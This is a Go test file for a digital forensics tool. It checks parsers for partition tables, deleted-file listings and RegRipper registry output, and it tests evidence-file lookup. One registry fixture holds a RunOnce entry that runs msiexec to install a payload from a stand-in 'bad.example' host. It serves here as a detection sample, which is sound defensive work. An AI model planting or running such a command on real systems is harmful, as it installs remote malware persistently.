package shell

import (
	"os"
	"strings"
	"testing"

	"github.com/yusif-v/mimir/internal/cases"
)

func TestDiskHintsMmls(t *testing.T) {
	out := `GUID Partition Table (EFI)
Offset Sector: 0
Units are in 512-byte sectors

      SLOT      START        END          LENGTH       Description
000:000    0            2047         2048         Safety Table
000:001    2048         206847       204800       EFI system partition
001:000    206848       122910719    122703872    Windows`
	hints := diskHints("mmls", out)
	if len(hints) != 3 {
		t.Fatalf("expected 3 partition hints, got %d: %+v", len(hints), hints)
	}
	if hints[1].typ != "partition" {
		t.Fatalf("hint type = %q, want partition", hints[1].typ)
	}
	if !strings.Contains(hints[1].val, "start=2048") || !strings.Contains(hints[1].val, "EFI system partition") {
		t.Fatalf("hint val = %q, want start + description", hints[1].val)
	}
}

func TestDiskHintsFlsDeleted(t *testing.T) {
	out := `r/r 1001-128-3:	$Secure:$SDS
r/r * 12345:	Documents/malware.exe
-/r * 12346:	Users/alice/secret.zip
d/d 2000:	Program Files
+ r/r * 12347:	pagefile.sys`
	hints := diskHints("fls", out)
	if len(hints) != 3 {
		t.Fatalf("expected 3 deleted_file hints (incl. continuation line), got %d: %+v", len(hints), hints)
	}
	got := map[string]bool{}
	for _, h := range hints {
		if h.typ != "deleted_file" {
			t.Fatalf("type = %q, want deleted_file", h.typ)
		}
		got[h.val] = true
	}
	for _, want := range []string{"Documents/malware.exe", "Users/alice/secret.zip", "pagefile.sys"} {
		if !got[want] {
			t.Fatalf("missing deleted file %q in %+v", want, got)
		}
	}
	// Allocated entries must NOT be flagged.
	for _, h := range hints {
		if strings.Contains(h.val, "Program Files") {
			t.Fatalf("allocated dir wrongly flagged: %+v", h)
		}
	}
}

func TestRegripperHintsUSBAndPathsAndRunKeys(t *testing.T) {
	out := `------------------------------
Software\Microsoft\Windows\CurrentVersion\Run
    Run -> C:\Users\alice\AppData\Local\Temp\rundll32.exe (LastWrite: ...)
USBSTOR\Disk&Ven_Kingston&Prod_DataTraveler_3.0
Service: evilsvc  ImagePath = C:\Windows\System32\svchost.exe -k netsvcs
RunOnce -> msiexec /i http://bad.example/payload.msi
------------------------------`
	hints := regripperHints(out)

	types := map[string]int{}
	vals := map[string]bool{}
	for _, h := range hints {
		types[h.typ]++
		vals[h.val] = true
	}
	if types["usb_device"] != 1 {
		t.Fatalf("expected 1 usb_device, got %d", types["usb_device"])
	}
	if !vals["USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler_3.0"] {
		t.Fatalf("missing USB device value")
	}
	winpaths := 0
	for v := range vals {
		if strings.HasSuffix(v, "rundll32.exe") && strings.HasPrefix(v, "C:") {
			winpaths++
		}
		if strings.HasSuffix(v, "svchost.exe") {
			winpaths++
		}
	}
	if winpaths != 2 {
		t.Fatalf("expected 2 exe paths, got %d (%+v)", winpaths, vals)
	}
	if types["autostart"] < 2 {
		t.Fatalf("expected >=2 autostart lines (Run + RunOnce), got %d", types["autostart"])
	}
}

func TestResolveEvidenceFileExplicitName(t *testing.T) {
	c := &cases.Case{Path: t.TempDir()}
	dir := c.Path + "/evidence"
	mustMkdir(t, dir)
	mustWrite(t, dir+"/disk.raw", "x")

	got, err := resolveEvidenceFile(c, "disk.raw", "disk-image", "hint")
	if err != nil {
		t.Fatal(err)
	}
	if got != dir+"/disk.raw" {
		t.Fatalf("got %q", got)
	}

	// Substring fallback.
	got, err = resolveEvidenceFile(c, "disk", "disk-image", "hint")
	if err != nil || got != dir+"/disk.raw" {
		t.Fatalf("substring resolve failed: %q err=%v", got, err)
	}

	// Missing name errors.
	if _, err := resolveEvidenceFile(c, "nope.img", "disk-image", "hint"); err == nil {
		t.Fatal("expected error for missing evidence")
	}
}

func TestResolveEvidenceFileAutoTagThenRecent(t *testing.T) {
	c := &cases.Case{Path: t.TempDir()}
	dir := c.Path + "/evidence"
	mustMkdir(t, dir)
	mustWrite(t, dir+"/log.txt", "x")
	mustWrite(t, dir+"/mem.dmp", "y")

	c.AppendEvidence(cases.EvidenceRecord{Name: "log.txt", Op: "add"})
	c.AppendEvidence(cases.EvidenceRecord{Name: "mem.dmp", Op: "add", Tags: []string{"memory-dump"}})

	// Tag preference wins over recency.
	got, err := resolveEvidenceFile(c, "", "memory-dump", "hint")
	if err != nil || got != dir+"/mem.dmp" {
		t.Fatalf("tag pref: %q err=%v", got, err)
	}

	// No matching tag -> most recent.
	c.AppendEvidence(cases.EvidenceRecord{Name: "img.raw", Op: "add", Tags: []string{"disk-image"}})
	mustWrite(t, dir+"/img.raw", "z")
	got, err = resolveEvidenceFile(c, "", "registry-hive", "hint")
	if err != nil || got != dir+"/img.raw" {
		t.Fatalf("recent fallback: %q err=%v", got, err)
	}
}

func mustMkdir(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0755); err != nil {
		t.Fatal(err)
	}
}

func mustWrite(t *testing.T, path, data string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(data), 0644); err != nil {
		t.Fatal(err)
	}
}
